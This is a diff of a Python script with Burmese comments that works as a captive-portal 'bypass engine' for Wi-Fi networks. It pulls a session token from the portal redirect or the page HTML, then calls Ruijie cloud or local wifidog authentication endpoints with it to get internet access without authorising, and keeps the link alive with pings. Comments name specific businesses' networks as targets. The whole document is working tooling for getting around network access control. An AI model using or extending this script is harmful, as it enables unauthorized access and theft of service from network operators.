@@ -20,12 +20,13 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-# တည်ငြိမ်မှုအတွက် Setting များ
+# Connection တည်ငြိမ်စေရန်
 PING_THREADS = 1 
 PING_INTERVAL = 2.0 
 
 GREEN = "\033[92m"
 RED = "\033[91m"
+CYAN = "\033[96m"
 RESET = "\033[0m"
 
 BABY_LOGO = """
@@ -60,7 +61,7 @@ def get_hwid():
     except: return "MOE-998A7F92-675"
 
 def get_current_gateway():
-    """System command မလိုဘဲ Gateway ကို socket ဖြင့် ရှာဖွေခြင်း"""
+    """Socket ဖြင့် Gateway ကို ရှာဖွေခြင်း (ip: not found fix)"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -79,36 +80,41 @@ def hacker_typing(text, style="bold green"):
     console.print()
 
 # ===============================
-# BYPASS ENGINE
+# BYPASS ENGINE (FINAL VERSION)
 # ===============================
 def start_bypass_process():
     while True:
         try:
+            # Session headers များထည့်သွင်းခြင်း
             session = requests.Session()
-            # အင်တာနက်မရှိချိန်မှာ Redirect ကို အဆုံးထိလိုက်ရန်
-            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
+            })
             
+            # ၁။ Portal URL ကို Redirect လိုက်၍ဖမ်းယူခြင်း
+            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
             portal_url = r.url
-            r1 = session.get(portal_url, timeout=10, verify=False)
             
-            # --- SID/TOKEN PARSING (Cloud & Local) ---
+            # ၂။ SID Parsing Logic
             params = parse_qs(urlparse(portal_url).query)
             sid = (params.get('sessionId') or params.get('session_id') or 
                    params.get('token') or params.get('auth_id') or [None])[0]
             
-            # HTML Body ထဲတွင်ပါ ထပ်ရှာခြင်း
             if not sid:
+                # URL မှာမတွေ့လျှင် HTML Page ကိုဖတ်၍ Regex ဖြင့်ရှာခြင်း
+                r1 = session.get(portal_url, timeout=10, verify=False)
                 sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
                 current_gw = get_current_gateway()
                 
-                # Cloud Portal သို့မဟုတ် Local Router ခွဲခြားခြင်း
-                if "ruijienetworks.com" in portal_url:
+                # Cham Myae Thaw Tar Cloud Portal ပုံစံလား စစ်ဆေးခြင်း
+                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                     auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                     mode = "RUIJIE-CLOUD"
                 else:
+                    # Local Router စနစ် (Zin Myo Aung, Ko Naing)
                     auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                     mode = "LOCAL-BYPASS"
                 
@@ -123,6 +129,7 @@ def start_bypass_process():
 
                 threading.Thread(target=pulse, daemon=True).start()
                 
+                # အင်တာနက် status ကိုစောင့်ကြည့်ခြင်း
                 while True:
                     try:
                         if session.get("http://www.google.com", timeout=5).status_code == 200:
@@ -132,7 +139,7 @@ def start_bypass_process():
             else:
                 sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                 time.sleep(3)
-        except Exception:
+        except Exception as e:
             time.sleep(5)
 
 if __name__ == "__main__":
